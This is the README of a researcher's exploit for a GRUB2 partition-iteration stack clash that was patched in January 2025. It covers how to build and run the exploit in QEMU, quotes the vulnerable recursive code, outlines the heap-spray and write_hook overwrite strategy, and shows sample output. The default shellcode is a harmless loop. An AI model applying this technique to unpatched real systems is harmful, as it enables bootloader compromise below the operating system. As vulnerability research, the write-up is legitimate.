# ClashGPT - bah / January 2025

This is an exploit for a bug in GRUB2 that was fixed in January 2025.
It was found, reported and patched by me.

## Usage

Make sure you have submodules initialized, as we build GRUB 2.12 from source.
Also have OVMF installed (`apt install ovmf`) as we need some uefi firmware.
You can compile ovmf from the edk2 tree if you want, I'm just using my distros
build.

Setup (bootstrap, configure, compile, and copy grub to ./artifacts/hda/):
```
just setup-grub && just build-grub && just install-grub
```

Run (generate the exploit files and write to `./artifacts/hda`, start qemu and
run GRUB):
```
just exploit && just run
```

Debug, after a `just run` in a different terminal:
```
just debug ADDRESS_FROM_GDBINFO
```

`gdbinfo` is in the early-grub.cfg, so it should show up as grub starts.
You may have to scroll up.
Check `scripts/grub-gdb.gdbs` for my custom GDB commands to get information from
GRUB (memory regions, variables defined, etc).

## The Bug - `part_iterate()` recursion

The bug is a recursion triggered by GRUB recursively looking into partitions of
partitions.

```
    int
    grub_partition_iterate (struct grub_disk *disk,
                grub_partition_iterate_hook_t hook, void *hook_data)
    {
      struct grub_partition_iterate_ctx ctx = {
        .ret = 0,
        .hook = hook,
        .hook_data = hook_data
      };
      const struct grub_partition_map *partmap;

      FOR_PARTITION_MAPS(partmap)
      {
        grub_err_t err;
[1]     err = partmap->iterate (disk, part_iterate, &ctx);
        if (err)
          grub_errno = GRUB_ERR_NONE;
        if (ctx.ret)
          break;
      }

      return ctx.ret;
    }
```

```
    static int
    part_iterate (grub_disk_t dsk, const grub_partition_t partition, void *data)
    {
      struct grub_partition_iterate_ctx *ctx = data;
      struct grub_partition p = *partition;

      if (!(grub_partition_check_containment (dsk, partition)))
        return 0;

      p.parent = dsk->partition;
      dsk->partition = 0;
      if (ctx->hook (dsk, &p, ctx->hook_data))
        {
          ctx->ret = 1;
          return 1;
        }
      if (p.start != 0)
        {
          const struct grub_partition_map *partmap;
          dsk->partition = &p;
          FOR_PARTITION_MAPS(partmap)
          {
        grub_err_t err;
[2]     err = partmap->iterate (dsk, part_iterate, ctx);
        if (err)
          grub_errno = GRUB_ERR_NONE;
        if (ctx->ret)
          break;
          }
        }
      dsk->partition = p.parent;
      return ctx->ret;
    }
```

```
    grub_err_t
    grub_gpt_partition_map_iterate (grub_disk_t disk,
                    grub_partition_iterate_hook_t hook,
                    void *hook_data)
    {
      struct grub_partition part;
      struct grub_gpt_header gpt;
      struct grub_gpt_partentry entry;
      struct grub_msdos_partition_mbr mbr;
      grub_uint64_t entries;
      unsigned int i;
      int last_offset = 0;
      int sector_log = 0;

      [ SNIP ]

      entries = grub_le_to_cpu64 (gpt.partitions) << sector_log;
      for (i = 0; i < grub_le_to_cpu32 (gpt.maxpart); i++)
        {
          if (grub_disk_read (disk, entries, last_offset,
                  sizeof (entry), &entry))
        return grub_errno;

          if (grub_memcmp (&grub_gpt_partition_type_empty, &entry.type,
                   sizeof (grub_gpt_partition_type_empty)))
        {
          /* Calculate the first block and the size of the partition.  */
          part.start = grub_le_to_cpu64 (entry.start) << sector_log;
          part.len = (grub_le_to_cpu64 (entry.end)
                  - grub_le_to_cpu64 (entry.start) + 1)  << sector_log;
          part.offset = entries;
          part.number = i;
          part.index = last_offset;
          part.partmap = &grub_gpt_partition_map;
          part.parent = disk->partition;

          grub_dprintf ("gpt", "GPT entry %d: start=%lld, length=%lld\n", i,
                (unsigned long long) part.start,
                (unsigned long long) part.len);

[4]       if (hook (disk, &part, hook_data))
            return grub_errno;
        }

        [ SNIP ]

    }
```

This is started by `grub_partition_iterate()` [1], which will go through each
registered partition map and call their iterate functions.
For example, `grub_gpt_partition_map_iterate()` for GPT and
`grub_partition_msdos_iterate()` for the msdos partition scheme.

So in the GPT case [4] will be hit, which will call in this case
`part_iterate()`.
`part_iterate()` will again go through all the registered partition maps and
call their iterate functions, calling them and passing itself as the hook [3].

So this can be chained to recursively call itself and corrupt objects in a heap
region allocated below the stack.


## Exploitation

* Initial Setup
* Forcing Memory Pressure
* Setting up the construction
* Probing to find the target variable
* Alignment
* Spraying grub_env_vars
* Overwriting the env var write_hook
* Taking control.

### Memory Layout After Applying Pressure

Looking at `lsefimmap` we can see the stack and our target range are adjacent:
```
Type      Physical start  - end             #Pages        Size Attributes
ldr-code  00000000bfe00000-00000000bfef0fff 000000f1    964KiB UC WC WT WB
BS-data   00000000bfef1000-00000000bff10fff 00000020    128KiB UC WC WT WB
```

Looking at RSP compared to the region and seeing how far we are away:
```
RSP - (region + size)
0xbff10518 - (0xbfe00000+987072) = 128344
```

### Taking Control

The protective MBR is the best way to get control.

so goal is just to get the target struct to be under our fake mbr / top block

using eval module, can work around this by defining a lookup table function.


## Output

You should see something like the following on successful exploitation:
```
ClashGPT - bah / January 2025
[!] setup
[!] Forcing memory pressure
error: out of memory.
[!] Setting up construction
error: no such device: does_not_exist.
[!] Corrupting: uwu_0
[!] Determining Depth
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
error: no such device: does_not_exist.
[!] Found: 313 0011 YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
[!] going for the kill
error: no such device: does_not_exist.
```

The default payload is just an infloop (EB FE), change that (SHELLCODE in
src/consts.py) if you want anything more.

## References

* https://web.archive.org/web/20050817190326/http://cansecwest.com/core05/memory_vulns_delalleau.pdf -
  if you care about stack clashes, these slides are old but good. Common bug
  class in firmware, been a few in iBoot.
* https://xerub.github.io/ios/iboot/2018/05/10/de-rebus-antiquis.html - The
  iBoot stack clash. Insane work! I actually did try the idea on using Tarjan's
  algorithm from here, using CFGs i got from angr, but it never worked that well
  for me.
* https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt - Qualys work on
  stack clashs in 2017 was how i first became aware of them as an exploitable
  bug class. Focuses on more modern userland linux exploitation, where the hard
  part is avoiding hitting a guard page.

## License

GPL3
